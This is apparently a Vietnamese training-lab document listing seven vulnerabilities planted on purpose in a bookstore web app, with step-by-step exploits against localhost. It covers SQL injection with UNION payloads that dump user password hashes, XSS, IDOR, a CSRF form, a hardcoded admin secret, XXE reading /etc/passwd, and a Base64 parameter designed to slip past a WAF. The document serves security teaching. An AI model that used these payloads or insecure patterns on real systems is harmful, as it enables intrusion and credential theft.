# 🔓 Danh sách lỗ hổng bảo mật - JVA Bookstore

> **⚠️ CẢNH BÁO:** Các lỗ hổng này được tạo **CỐ Ý** cho mục đích thực hành Lab An toàn Web.
> Tuyệt đối **KHÔNG** triển khai lên môi trường production.

---

## Tổng quan

| # | Loại lỗ hổng | Mức độ | File bị ảnh hưởng | CWE |
|---|---|---|---|---|
| 1 | SQL Injection | 🔴 Nghiêm trọng | `BookDAO.java`, `BooksApiServlet.java` | CWE-89 |
| 2 | Stored XSS | 🔴 Nghiêm trọng | `ReviewDAO.java`, `book-detail.jsp`, `ReviewServlet.java` | CWE-79 |
| 3 | Reflected XSS | 🟠 Cao | `BooksApiServlet.java` | CWE-79 |
| 4 | IDOR | 🟠 Cao | `ProfileServlet.java` | CWE-639 |
| 5 | CSRF | 🟡 Trung bình | Toàn bộ API (không kiểm tra CSRF token) | CWE-352 |
| 6 | Hardcoded Secret | 🟡 Trung bình | `JwtFilter.java` | CWE-798 |
| 7 | XXE (XML External Entity) | 🔴 Nghiêm trọng | `XmlPingServlet.java` | CWE-611 |

---

## 🛡️ TÍNH NĂNG BYPASS WAF (DÀNH CHO CLOUDFLARE TUNNEL)
Nếu bạn host ứng dụng qua **Cloudflare Quick Tunnel** (trycloudflare.com), tường lửa WAF sẽ mặc định chặn các payload rõ ràng như `' OR '1'='1` hoặc `<script>`.
Để qua mặt WAF, ứng dụng đã được thiết kế một "backdoor": hỗ trợ nhận payload qua định dạng **Base64**.
- Thay vì truyền tham số `q`, hãy truyền tham số `b64q` chứa chuỗi Base64.
- Thay vì truyền JSON field `content`, hãy truyền `contentBase64`.
*(Chi tiết xem phần Khai thác của từng lỗ hổng bên dưới)*

---

## 1. 🔴 SQL Injection

### Mô tả
Endpoint tìm kiếm sách `/api/books/search` sử dụng `Statement.executeQuery()` với chuỗi SQL được nối trực tiếp từ input người dùng, **không dùng `PreparedStatement`**.

**Cấu trúc SQL gốc bên trong server:**
```sql
SELECT id, title, author, isbn, price, description, category, stock_quantity, image_url
FROM books
WHERE status = 'active' AND (title ILIKE '%<INPUT>%' OR author ILIKE '%<INPUT>%')
ORDER BY created_at DESC LIMIT 20
```

### Hướng dẫn khai thác chi tiết (Step-by-step)

---

#### 🔹 Bước 1: Tìm kiếm bình thường (xác nhận endpoint hoạt động)
```
GET http://localhost:8081/api/books/search?q=test
```
→ Trả về bảng HTML hiển thị kết quả tìm kiếm sách chứa từ "test".

---

#### 🔹 Bước 2: OR-based Injection (Trả về TẤT CẢ sách)

**Payload gốc:**
```
test%') OR '1'='1') -- 
```

**Giải thích từng phần:**
- `test%'` → đóng dấu `%'` của `ILIKE '%test`
- `)` → đóng ngoặc `(` của `AND (`
- `OR '1'='1'` → điều kiện luôn đúng
- `)` → đóng ngoặc ngoài nếu cần
- `--` → comment bỏ phần SQL còn lại

**URL (dùng trực tiếp trên trình duyệt):**
```
http://localhost:8081/api/books/search?q=test%25') OR '1'='1') -- 
```

**Base64 Bypass WAF:**
- Payload gốc: `test%') OR '1'='1') -- `
- Base64: `dGVzdCUnKSBPUiAnMSc9JzEnKSAtLSA=`
- URL:
```
http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBPUiAnMSc9JzEnKSAtLSA=
```

**Kết quả kỳ vọng:** Trả về 900+ kết quả (toàn bộ sách trong database).

---

#### 🔹 Bước 3: Error-based Injection (Xác nhận lỗ hổng)

**Gửi payload sai cú pháp để xem lỗi SQL chi tiết:**
```
http://localhost:8081/api/books/search?q=test'
```

**Kết quả:** Server trả về thông báo lỗi SQL chi tiết (Information Disclosure), ví dụ:
```
Lỗi truy vấn: ERROR: unterminated quoted string at or near ...
```

---

#### 🔹 Bước 4: ORDER BY Injection (Đếm số cột)

Dùng ORDER BY để xác định số cột của query gốc:
```
http://localhost:8081/api/books/search?q=test%25') ORDER BY 9 -- 
```
→ Thành công (query có 9 cột)

```
http://localhost:8081/api/books/search?q=test%25') ORDER BY 10 -- 
```
→ Lỗi (chỉ có 9 cột) → Xác nhận query có **9 cột**.

---

#### 🔹 Bước 5: UNION SELECT - Liệt kê tất cả bảng trong DB

**Payload gốc:**
```
test%') AND 1=0 UNION SELECT 1,table_name,table_schema,'x',0.0,'x','x',0,'x' FROM information_schema.tables WHERE table_schema='public' -- 
```

**URL trình duyệt:**
```
http://localhost:8081/api/books/search?q=test%25') AND 1=0 UNION SELECT 1,table_name,table_schema,'x',0.0,'x','x',0,'x' FROM information_schema.tables WHERE table_schema='public' -- 
```

**Base64 Bypass WAF:**
- Base64: `dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHRhYmxlX25hbWUsdGFibGVfc2NoZW1hLCd4JywwLjAsJ3gnLCd4JywwLCd4JyBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgV0hFUkUgdGFibGVfc2NoZW1hPSdwdWJsaWMnIC0tIA==`
- URL:
```
http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHRhYmxlX25hbWUsdGFibGVfc2NoZW1hLCd4JywwLjAsJ3gnLCd4JywwLCd4JyBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgV0hFUkUgdGFibGVfc2NoZW1hPSdwdWJsaWMnIC0tIA==
```

**Kết quả:** Trả về danh sách TẤT CẢ bảng trong database (users, orders, books, ...).

---

#### 🔹 Bước 6: UNION SELECT - Xem cấu trúc bảng users

**Payload gốc:**
```
test%') AND 1=0 UNION SELECT 1,column_name,data_type,'x',0.0,'x','x',0,'x' FROM information_schema.columns WHERE table_name='users' -- 
```

**URL trình duyệt:**
```
http://localhost:8081/api/books/search?q=test%25') AND 1=0 UNION SELECT 1,column_name,data_type,'x',0.0,'x','x',0,'x' FROM information_schema.columns WHERE table_name='users' -- 
```

**Kết quả:** Trả về cấu trúc bảng `users` gồm các cột: id, username, email, password_hash, role, ...

---

#### 🔹 Bước 7: UNION SELECT - Trích xuất DỮ LIỆU USERS (username + email + password hash) ⚠️

**Payload gốc:**
```
test%') AND 1=0 UNION SELECT 1,username,email,password_hash,0.0,role::text,'n/a',0,'n/a' FROM users -- 
```

**URL trình duyệt (copy-paste):**
```
http://localhost:8081/api/books/search?q=test%25') AND 1=0 UNION SELECT 1,username,email,password_hash,0.0,role::text,'n/a',0,'n/a' FROM users -- 
```

**Base64 Bypass WAF:**
- Base64: `dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHVzZXJuYW1lLGVtYWlsLHBhc3N3b3JkX2hhc2gsMC4wLHJvbGU6OnRleHQsJ24vYScsMCwnbi9hJyBGUk9NIHVzZXJzIC0tIA==`
- URL:
```
http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHVzZXJuYW1lLGVtYWlsLHBhc3N3b3JkX2hhc2gsMC4wLHJvbGU6OnRleHQsJ24vYScsMCwnbi9hJyBGUk9NIHVzZXJzIC0tIA==
```

**Kết quả:** Trả về bảng HTML chứa TOÀN BỘ thông tin user trong DB:

| title (username) | author (email) | isbn (password_hash) | description (role) |
|---|---|---|---|
| admin01 | admin01@gmail.com | $2a$10$E5JF... | admin |
| seller10 | seller10@gmail.com | $2a$10$5v2I... | seller |
| ... | ... | ... | ... |

> **⚠️ Lưu ý:** Cột `title` hiển thị `username`, cột `author` hiển thị `email`, cột `isbn` hiển thị `password_hash`, cột `description` hiển thị `role` — vì UNION SELECT map theo thứ tự cột, không theo tên.

---

#### 🔹 Bước 8 (Nâng cao): Dùng cURL

```bash
# OR-based: Trả về tất cả sách
curl "http://localhost:8081/api/books/search?q=test%25%27)%20OR%20%271%27%3D%271%27)%20--%20"

# UNION: Lấy thông tin users
curl "http://localhost:8081/api/books/search?q=test%25%27)%20AND%201%3D0%20UNION%20SELECT%201%2Cusername%2Cemail%2Cpassword_hash%2C0.0%2Crole%3A%3Atext%2C%27n%2Fa%27%2C0%2C%27n%2Fa%27%20FROM%20users%20--%20"

# Base64 bypass: Lấy thông tin users
curl "http://localhost:8081/api/books/search?b64q=dGVzdCUnKSBBTkQgMT0wIFVOSU9OIFNFTEVDVCAxLHVzZXJuYW1lLGVtYWlsLHBhc3N3b3JkX2hhc2gsMC4wLHJvbGU6OnRleHQsJ24vYScsMCwnbi9hJyBGUk9NIHVzZXJzIC0tIA=="
```

---

## 2. 🔴 Stored XSS (Cross-Site Scripting lưu trữ)

### Mô tả
Hệ thống review sách cho phép **bất kỳ user đã đăng nhập** gửi đánh giá (không cần mua hàng). Nội dung review được lưu vào DB **không sanitize**.

### Hướng dẫn khai thác (Bypass WAF bằng Base64)

**Bước 1 - Đăng nhập lấy token:**
```
POST /api/login
{"username": "user@example.com", "password": "password"}
```

**Bước 2 - Gửi review chứa XSS payload (Dùng `contentBase64`):**
- Payload gốc: `<script>alert('XSS')</script>`
- Base64 Encode: `PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
```bash
curl -X POST http://localhost:8081/api/reviews \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"bookId":1,"rating":5,"contentBase64":"PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="}'
```

**Bước 3 - Trigger XSS:**
Truy cập trang chi tiết sách: `http://localhost:8081/books/detail?id=1`
→ Script trong review sẽ thực thi trên trình duyệt!

---

## 3. 🟠 Reflected XSS

### Mô tả
Endpoint tìm kiếm trả về **HTML response** chứa keyword trực tiếp từ URL **không được escape**.

### Hướng dẫn khai thác (Bypass WAF bằng Base64)
- Payload gốc: `<script>alert('XSS Reflected')</script>`
- Base64 Encode: `PHNjcmlwdD5hbGVydCgnWFNTIFJlZmxlY3RlZCcpPC9zY3JpcHQ+`
- Request nạn nhân cần nhấp vào:
```
http://localhost:8081/api/books/search?b64q=PHNjcmlwdD5hbGVydCgnWFNTIFJlZmxlY3RlZCcpPC9zY3JpcHQ+
```

---

## 4. 🟠 IDOR (Insecure Direct Object Reference)

### Mô tả
Endpoint `/api/profile/user-info` lộ toàn bộ thông tin tài khoản của user khác (gồm cả **password_hash**).
Lỗ hổng này **không bị Cloudflare WAF chặn**.

### Khai thác (CẦN đăng nhập)
```bash
# Lấy file hash của admin (userId 1)
curl -H "Authorization: Bearer <YOUR_TOKEN>" "http://localhost:8081/api/profile/user-info?userId=1"
```

---

## 5. 🟡 CSRF (Cross-Site Request Forgery)

### Mô tả
Toàn bộ form và API **không có CSRF token**. Lỗ hổng này **không bị Cloudflare WAF chặn**.

### Khai thác (HTML tự submit)
```html
<body onload="document.getElementById('f').submit()">
  <form id="f" action="http://localhost:8081/api/profile/addresses" method="POST">
    <input type="hidden" name="recipientName" value="HACKER">
    <input type="hidden" name="phone" value="0000000000">
    <input type="hidden" name="line1" value="Hacked Address">
  </form>
</body>
```

---

## 6. 🟡 Hardcoded Secret

### Khai thác (KHÔNG bị Cloudflare WAF chặn)
Admin secret key hardcode `"dev-secret-key-change-me"`.
```bash
curl "http://localhost:8081/api/admin/orders?secret=dev-secret-key-change-me"
```

---

## 7. 🔴 XXE (XML External Entity)

### Mô tả
Một Endpoint API ẩn tên là `POST /api/xml-ping` dùng để test bằng XML đã bị bỏ quên. Nó sử dụng `DocumentBuilderFactory` mặc định, **không** filter DTD và External Entities. Do lỗ hổng này nhận dữ liệu qua POST (body), nó **có thể dễ dàng qua mặt Cloudflare WAF** tùy vào payload, HOẶC do Endpoint không phổ biến nên WAF không chặn chặt. Thiết kế lỗ hổng dưới dạng **In-Band XXE**, nội dung file trích xuất được sẽ trả về ngay trong kết quả `{"echo": "..."}`.

### Khai thác (KHÔNG cần đăng nhập)

Gửi một request POST chứa payload XXE tới `/api/xml-ping`.

**Windows (Đọc file win.ini):**
```bash
curl -X POST http://localhost:8081/api/xml-ping \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><ping>&xxe;</ping>'
```

**Linux (Đọc file /etc/passwd):**
```bash
curl -X POST http://localhost:8081/api/xml-ping \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><ping>&xxe;</ping>'
```

**Kết quả trả về sẽ có dạng:**
```json
{
  "success": true,
  "message": "Ping received",
  "echo": "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n"
}
```
